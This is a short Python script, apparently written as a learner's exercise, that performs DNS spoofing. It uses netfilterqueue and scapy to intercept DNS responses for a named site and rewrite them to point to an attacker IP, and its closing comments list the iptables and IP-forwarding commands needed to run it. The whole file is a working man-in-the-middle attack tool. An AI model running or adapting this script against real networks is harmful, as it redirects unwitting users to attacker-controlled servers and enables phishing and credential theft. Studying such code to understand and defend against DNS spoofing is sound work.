#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

# python3 version

# implementation of the callback fucntion (do not be scared we use it afterwards)

def process_packet(packet):
    # convert the packets into scapy packets and analyse the IP headers
    scapy_packet = scapy.IP(packet.get_payload())
    # if this packet is DNS response type
    if scapy_packet.haslayer(scapy.DNSRR):
        # put this packet into a variable
        qname = scapy_packet[scapy.DNSQR].qname
        # if this qname response has the specific site
        # cast the qname to string in because in order to work with python3 you must have same type of vars
        # in a comparison
        # alternative method --> if "www.bing.com" in qname.decode():
        # old code to compare --> if "www.leonariks.gr" in qname:
        if "www.leonariks.gr" in str(qname):
            print("[+] Spoofing target")
            # fool the victim and modify attributes of the packet with changed IP (THE ONE OF THE ATTACKER)
            answer = scapy.DNSRR(rrname=qname, rdata = "192.168.22.7")
            # set the answer variable as a dns response
            scapy_packet[scapy.DNS].an = answer
            # set only one answer
            scapy_packet[scapy.DNS].ancount = 1

            # delete the attributes that check the originality of communication
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            # set the scapy packet (modified packet) as the main packet
            # and cast the scapy_packet to bytes object in order to get along with python3
            # because the set_payload object expects a byte object in python
            # old code --> packet.set_payload(str(scapy_packet))
            packet.set_payload(bytes(scapy_packet))

    # show the packets general view
    # print(scapy_packet.show())
    # accept or drop the packets of the queue
    packet.accept()
    # DROP THEM
    # packet.drop()



# create an instance of netfilterqueue object to interact with a queue number 0 look my notes
queue = netfilterqueue.NetfilterQueue()

# invoke a method to connect to queue 0 and give a callback function (process_packet) to be executed in each packet of the queue
queue.bind(0, process_packet)

# run the queue
queue.run()




# commands for this effort to run

# echo 1 > /proc/sys/net/ipv4/ip_forward

# iptables -I FORWARD -j NFQUEUE --queue-num 0

# for local use

# iptables -I OUTPUT -j NFQUEUE --queue-num 0
# iptables -I INPUT -j NFQUEUE --queue-num 0

# service apache2 start

# after all

# iptables --flush




